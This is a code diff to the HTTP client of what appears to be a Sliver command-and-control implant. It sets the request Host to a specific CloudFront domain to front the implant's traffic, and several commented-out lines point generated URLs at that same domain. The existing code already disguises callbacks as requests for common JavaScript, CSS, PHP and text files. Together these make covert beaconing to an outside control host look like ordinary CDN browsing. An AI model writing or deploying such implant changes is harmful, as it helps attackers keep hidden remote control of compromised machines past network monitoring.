@@ -123,7 +123,8 @@ func (s *SliverHTTPClient) newHTTPRequest(method, uri string, body io.Reader) *h
 	req, _ := http.NewRequest(method, uri, body)
 	req.Header.Set("User-Agent", defaultUserAgent)
 	req.Header.Set("Accept-Language", "en-US")
-	req.Header.Set("Host","d2umm24rbp53ai.cloudfront.net")
+	//req.Header.Set("Host","d2umm24rbp53ai.cloudfront.net")
+	req.Host = "d2umm24rbp53ai.cloudfront.net"
 	return req
 }
 
@@ -257,6 +258,7 @@ func (s *SliverHTTPClient) jsURL() string {
 	segments := []string{"js", "static", "assets", "dist", "javascript"}
 	filenames := []string{"underscore.min.js", "jquery.min.js", "bootstrap.min.js"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	//curl.Host = "d2umm24rbp53ai.cloudfront.net"
 	return curl.String()
 }
 
@@ -265,6 +267,7 @@ func (s *SliverHTTPClient) cssURL() string {
 	segments := []string{"css", "static", "assets", "dist", "stylesheets", "style"}
 	filenames := []string{"bootstrap.min.css"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	//curl.Host = "d2umm24rbp53ai.cloudfront.net"
 	return curl.String()
 }
 
@@ -273,6 +276,7 @@ func (s *SliverHTTPClient) phpURL() string {
 	segments := []string{"api", "rest", "drupal", "wordpress"}
 	filenames := []string{"login.php", "signin.php", "api.php", "samples.php"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	//curl.Host = "d2umm24rbp53ai.cloudfront.net"
 	return curl.String()
 }
 
@@ -281,6 +285,7 @@ func (s *SliverHTTPClient) txtURL() string {
 	segments := []string{"static", "www", "assets", "textual", "docs", "sample"}
 	filenames := []string{"robots.txt", "sample.txt", "info.txt", "example.txt"}
 	curl.Path = path.Join(s.randomPath(segments, filenames)...)
+	//curl.Host = "d2umm24rbp53ai.cloudfront.net"
 	return curl.String()
 }
 
